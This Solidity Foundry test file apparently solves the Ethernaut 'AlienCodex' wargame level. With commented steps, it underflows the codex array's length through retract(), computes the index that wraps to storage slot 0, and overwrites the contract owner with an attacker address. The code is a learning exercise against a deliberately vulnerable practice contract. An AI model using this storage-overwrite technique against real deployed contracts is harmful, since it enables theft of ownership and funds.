// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {IAlienCodex} from "src/hack/interfaces/IAlienCodex.sol";

interface IAlienCodexFactory {
    function validateInstance(address payable, address) external returns (bool);
}

contract AlienCodexTest is Test {
    address private attacker = makeAddr("attacker");

    IAlienCodex private alienCodex;
    IAlienCodexFactory private factory;

    function setUp() external {
        // At the time of writing, Foundry does not support contract compilation if one of the contracts involved uses an older version of Solidity.
        // Hence, we deploy the contract using compiler generated creation code

        // deploy AlienCodexFactory contract
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("AlienCodexFactory.sol")
        );
        address factoryAddress;
        assembly {
            factoryAddress := create(
                0, // value of ether
                add(bytecode, 0x20), // first word stores length of bytes data, so skip first 32 bytes
                mload(bytecode)
            )
        }
        factory = IAlienCodexFactory(factoryAddress);

        // deploy AlienCodex contract
        bytecode = abi.encodePacked(vm.getCode("AlienCodex.sol"));
        address alienCodexAddress;
        assembly {
            alienCodexAddress := create(
                0, // value of ether
                add(bytecode, 0x20), // first word stores length of bytes data, so skip first 32 bytes
                mload(bytecode)
            )
        }
        alienCodex = IAlienCodex(alienCodexAddress);
    }

    function test_AlienCodexHack() external {
        // Set contact to true so that it can pass the modifier
        alienCodex.makeContact();

        // calling retract(), we get an array of length 2^256 -1 i.e.
        // this expands the size of array to cover all the storage slots
        // all the storage slots now can be accessed by array.
        alienCodex.retract();

        // Find the offset of owner variable in the array
        // Find array index which corresponds to the storage slot 0
        uint256 codexArraySlot = 1;
        // calculate the slot from which the actual array starts
        uint256 codexBeginLocation = uint256(
            keccak256(abi.encode(codexArraySlot))
        );
        // The index of owner in codex array is calculated as
        // 2^256 (array length) - array start location
        uint256 ownerOffset;
        unchecked {
            // To avoid compiler error we need -1+1
            ownerOffset = (2 ** 256) - 1 - codexBeginLocation + 1;
        }

        console2.log("Attacker Before : ", alienCodex.owner());

        // set attacker as the owner
        vm.prank(attacker, attacker);
        alienCodex.revise(ownerOffset, bytes32(uint256(uint160(attacker))));

        console2.log("Attacker After : ", alienCodex.owner());

        address owner = alienCodex.owner();
        assertEq(owner, attacker, "Owner Not Set");

        bool success = factory.validateInstance(
            payable(address(alienCodex)),
            attacker
        );
        assertTrue(success, "Failed to validate the instance!!!");
    }
}
